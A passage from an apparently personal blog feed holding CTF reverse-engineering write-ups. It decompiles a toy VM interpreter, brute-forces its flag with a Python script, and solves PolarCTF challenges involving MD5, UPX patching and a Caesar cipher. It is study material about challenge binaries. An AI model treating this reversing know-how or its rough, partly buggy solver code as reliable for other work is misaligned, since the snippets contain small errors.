class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = op_index;</span><br><span class="line">    <span class="keyword">if</span> ( op_index &gt;= a2 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">switch</span> ( a1[op_index] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        op_code[v7] = v4;</span><br><span class="line">        ++op_index;</span><br><span class="line">        ++v6;</span><br><span class="line">        ++v8;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = a1[op_index + <span class="number">1</span>] + op_code[v8];</span><br><span class="line">        op_index += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = op_code[v8] - <span class="title function_ invoke__">LOBYTE</span>(a1[op_index + <span class="number">1</span>]);</span><br><span class="line">        op_index += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v4 = a1[op_index + <span class="number">1</span>] ^ op_code[v8];</span><br><span class="line">        op_index += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4 = a1[op_index + <span class="number">1</span>] * op_code[v8];</span><br><span class="line">        op_index += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++op_index;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( op_code[v8] != a1[op_index + <span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="title function_ invoke__">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">          <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">        op_index += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        op_code[v5] = v4;</span><br><span class="line"></span><br><span class="line">        ++op_index;</span><br><span class="line">        ++v5;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        <span class="title function_ invoke__">read</span>(op_code);</span><br><span class="line">        ++op_index;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v4 = op_code[v8] - <span class="number">1</span>;</span><br><span class="line">        ++op_index;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v4 = op_code[v8] + <span class="number">1</span>;</span><br><span class="line">        ++op_index;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="comment">//该代码经过阅读理解对变量进行了重命名</span></span><br><span class="line"><span class="comment">//字符数组是用来存储op_code的 在每个case中都出现的变量应该是指针索引</span></span><br></pre></td></tr></table></figure><p>分析一下这些case 我们发现可以分为三类</p><p><strong>第一类：验证类</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">       <span class="keyword">if</span> ( op_code[v8] != a1[op_index + <span class="number">1</span>] )</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="title function_ invoke__">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">         <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       ++v7;</span><br><span class="line">       op_index += <span class="number">2</span>;</span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>其实就是把输入的字符串经过一系列操作之后存到了<code>opcode</code>中</p><p><strong>第二类：字符处理</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  v4 = a1[op_index + <span class="number">1</span>] + op_code[v8];</span><br><span class="line">  op_index += <span class="number">2</span>;<span class="comment">//加法</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">  v4 = op_code[v8] - <span class="title function_ invoke__">LOBYTE</span>(a1[op_index + <span class="number">1</span>]);</span><br><span class="line">  op_index += <span class="number">2</span>;<span class="comment">//减法</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">  v4 = a1[op_index + <span class="number">1</span>] ^ op_code[v8];</span><br><span class="line">  op_index += <span class="number">2</span>;<span class="comment">//异或</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">  v4 = a1[op_index + <span class="number">1</span>] * op_code[v8];</span><br><span class="line">  op_index += <span class="number">2</span>;<span class="comment">//乘法</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">  v4 = op_code[v8] - <span class="number">1</span>;</span><br><span class="line">  ++op_index;<span class="comment">//自减</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">  v4 = op_code[v8] + <span class="number">1</span>;</span><br><span class="line">  ++op_index;<span class="comment">//自增</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p><strong>第三类：其他操作</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        op_code[v7] = v4;</span><br><span class="line">        ++op_index;</span><br><span class="line">        ++v6;</span><br><span class="line">        ++v8;</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//赋值操作</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++op_index;</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//啥也不干指针++</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        op_code[v5] = v4;</span><br><span class="line">        ++op_index;</span><br><span class="line">        ++v5;</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//变量赋值</span></span><br></pre></td></tr></table></figure><p>进一步分析我们发现：v5 v6 v7  v8是数组的索引，v4为操作的返回值.这样switch就分析的很明了了。下面回过头来看一看op_code。发现在比较操作数7第一次出现的位置之后，都是一些无效指令(大于12)，所以，加密运算应该是在操作数7第一次出现之前完成。因此有效的opcode应该是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">10</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, </span><br><span class="line"><span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line"> <span class="number">3</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, </span><br><span class="line"><span class="number">1</span>, <span class="number">2</span>, <span class="number">81</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>,</span><br><span class="line"> <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">54</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">32</span>, <span class="number">8</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, </span><br><span class="line"><span class="number">2</span>, <span class="number">65</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>分析剩余的部分。既然case7是对数据进行验证。那么7后面跟着的就是加密后的字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span>,<span class="number">34</span>,<span class="number">7</span>,<span class="number">63</span>,<span class="number">7</span>,<span class="number">52</span>,<span class="number">7</span>,<span class="number">50</span>,<span class="number">7</span>,<span class="number">114</span>,<span class="number">7</span>,<span class="number">51</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">24</span>,<span class="number">7</span>,<span class="number">4294967207</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">49</span>,<span class="number">7</span>,<span class="number">4294967281</span>,<span class="number">7</span>,</span><br><span class="line"><span class="number">40</span>,<span class="number">7</span>,<span class="number">4294967172</span>,<span class="number">7</span>,<span class="number">4294967233</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">30</span>,<span class="number">7</span>,<span class="number">122</span>]</span><br></pre></td></tr></table></figure><p>整理后开始写re脚本。由于本题逆向来写的话实现操作比较复杂所以我们采取正向遍历的思路去试出<code>flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">encrypts = [<span class="number">0x22</span>, <span class="number">0x3F</span>, <span class="number">0x34</span>, <span class="number">0x32</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x18</span>, <span class="number">0xA7</span>, <span class="number">0x31</span>, <span class="number">0xF1</span>, <span class="number">0x28</span>, <span class="number">0x84</span>, <span class="number">0xC1</span>, <span class="number">0x1E</span>, <span class="number">0x7A</span>]</span><br><span class="line"></span><br><span class="line">data = [[<span class="number">4</span>, <span class="number">0x10</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">4</span>, <span class="number">0x20</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">3</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">0x0B</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">0x0C</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">0x21</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">0x0B</span>, <span class="number">8</span>, <span class="number">0x0B</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">0x20</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">2</span>, <span class="number">0x51</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">0x24</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">0x0C</span>, <span class="number">8</span>, <span class="number">0x0B</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">0x25</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">2</span>, <span class="number">0x36</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">0x41</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">2</span>, <span class="number">0x20</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">0x25</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">0x20</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">2</span>, <span class="number">0x41</span>, <span class="number">8</span>, <span class="number">0x0C</span>, <span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line">for_each = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;0&#x27;</span>]</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">encrypted</span>(c, li):</span><br><span class="line">    <span class="comment"># print(li)</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x &lt; <span class="title function_ invoke__">len</span>(li):</span><br><span class="line">        <span class="keyword">if</span> li[x] == <span class="number">2</span>:</span><br><span class="line">            c = c + li[x + <span class="number">1</span>]</span><br><span class="line">            x += <span class="number">2</span></span><br><span class="line">        elif li[x] == <span class="number">3</span>:</span><br><span class="line">            c = c - li[x + <span class="number">1</span>]</span><br><span class="line">            x += <span class="number">2</span></span><br><span class="line">        elif li[x] == <span class="number">4</span>:</span><br><span class="line">            c = c ^ li[x + <span class="number">1</span>]</span><br><span class="line">            x += <span class="number">2</span></span><br><span class="line">        elif li[x] == <span class="number">5</span>:</span><br><span class="line">            c = c * li[x + <span class="number">1</span>]</span><br><span class="line">            x += <span class="number">2</span></span><br><span class="line">        elif li[x] == <span class="number">11</span>:</span><br><span class="line">            c = c - <span class="number">1</span></span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">        elif li[x] == <span class="number">12</span>:</span><br><span class="line">            c = c + <span class="number">1</span></span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">        elif li[x] == <span class="number">8</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">        elif li[x] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    res = c</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(encrypts)):</span><br><span class="line">        <span class="keyword">for</span> i in for_each:</span><br><span class="line">            tmp = <span class="title function_ invoke__">encrypted</span>(<span class="title function_ invoke__">ord</span>(i), data[x])</span><br><span class="line">            <span class="keyword">if</span> tmp == encrypts[x]:</span><br><span class="line">                flag += i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&#x27;flag&#123;%s&#125;&#x27;</span> % flag)</span><br></pre></td></tr></table></figure><h2 id="0x05后记"><a href="#0x05后记" class="headerlink" title="0x05后记"></a>0x05后记</h2><p>在我看来，vm虚拟机保护逆向，是一种利用了虚拟机技术的一种特殊加花指令方式。目前比赛中，虚拟机题目特点是核心算法不是很复杂，虚拟机本身没有反调试和代码加密混淆的加入。大部分题目的思路都是考察分析switch语句及其分支。当然，随着整体CTF水平的不断进步，未来虚拟机逆向难度只会越来越高。</p><p>这两天应该会写出系列的第二篇文章，围绕vm虚拟机逆向进阶操作。以及网鼎杯题目的更多解法思路讨论（利用angr）敬请期待</p><h2 id="0x06参考链接"><a href="#0x06参考链接" class="headerlink" title="0x06参考链接"></a>0x06参考链接</h2><p><a href="https://www.cnblogs.com/nigacat/p/13039289.html">https://www.cnblogs.com/nigacat/p/13039289.html</a></p><p><a href="https://www.freebuf.com/column/174623.html">https://www.freebuf.com/column/174623.html</a></p><p><a href="https://xz.aliyun.com/t/3851">https://xz.aliyun.com/t/3851</a></p><p><a href="https://blog.csdn.net/weixin_43876357/article/details/108570305">https://blog.csdn.net/weixin_43876357/article/details/108570305</a></p><p><a href="https://blog.csdn.net/weixin_45055269/article/details/105940348">https://blog.csdn.net/weixin_45055269/article/details/105940348</a></p><p><a href="https://blog.csdn.net/lhk124/article/details/108946313">https://blog.csdn.net/lhk124/article/details/108946313</a></p><p><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/78884187">https://blog.csdn.net/xiangshangbashaonian/article/details/78884187</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;那CTF，那VMre，那些事（一）&quot;&gt;&lt;a href=&quot;#那CTF，那VMre，那些事（一）&quot; class=&quot;headerlink&quot; title=&quot;那CTF，那VMre，那些事（一）&quot;&gt;&lt;/a&gt;那CTF，那VMre，那些事（一）&lt;/h3&gt;&lt;p&gt;  vm虚拟机保护逆</summary>
      
    
    
    
    
    <category term="VM RE" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/VM-RE/"/>
    
  </entry>
  
  <entry>
    <title>PolarCTF</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/25/PolarCTF2024%E6%98%A5/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/25/PolarCTF2024%E6%98%A5/</id>
    <published>2024-03-24T16:00:00.000Z</published>
    <updated>2024-09-16T07:15:04.178Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PolarCTF"><a href="#PolarCTF" class="headerlink" title="PolarCTF"></a>PolarCTF</h1><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="app-login"><a href="#app-login" class="headerlink" title="app_login"></a>app_login</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag = <span class="string">&#x27;zhishixuebao&#x27;</span></span><br><span class="line">x = hashlib.md5(flag.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">y = x.hexdigest()</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(y),<span class="number">2</span>):</span><br><span class="line">    flag+=y[i]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">flagg=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    t=((<span class="number">255</span>-i)+<span class="number">2</span>)-<span class="number">98</span>-<span class="number">48</span></span><br><span class="line">    flagg+=<span class="built_in">chr</span>(t)</span><br><span class="line"><span class="built_in">print</span>(flagg)</span><br></pre></td></tr></table></figure><h3 id="kr"><a href="#kr" class="headerlink" title="kr"></a>kr</h3><p>？？？winhex动态调试</p><p>但是没找到kr，我用的x32dbg</p><p>，，？因为upx脱不了壳儿，会显示999（3e7),和偏移量</p><p>然后从偏移量和999找指令，然后e703变成e713（？</p><p>继续运行可以得到？<br>这是在干什么</p><h3 id="猜猜我在哪儿"><a href="#猜猜我在哪儿" class="headerlink" title="猜猜我在哪儿"></a>猜猜我在哪儿</h3><p>基本也就是自加密逆向</p><p>原字符flag经过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; input[i]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    ch_0 = input[i];</span><br><span class="line">    <span class="keyword">if</span> ( ch_0 &lt;= <span class="number">96</span> || ch_0 &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ch_0 &gt; <span class="number">64</span> &amp;&amp; ch_0 &lt;= <span class="number">90</span> )</span><br><span class="line">        ch_0 = (ch_0 - <span class="number">65</span> + key) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ch_0 = (ch_0 - <span class="number">97</span> + key) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    result[i] = ch_0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果key&#x3D;&#x3D;111，变成48</p><p>变成khb i0dj lv qrw khuh</p><p>逆向：</p><p>khb i0dj lv qrw khuh</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">encrypto</span><span class="params">(<span class="type">char</span> *input,<span class="type">int</span> key)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> s[]=<span class="string">&quot;khb i0dj lv qrw khuh&quot;</span>;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(s);++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="number">48</span>)s[i]=<span class="number">111</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;<span class="number">5</span>;++k)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,encrypto(s,k));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *encrypt(<span class="type">char</span> *input,<span class="type">int</span> key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *result;</span><br><span class="line">    <span class="type">char</span> ch_0;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    </span><br><span class="line">    result = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span 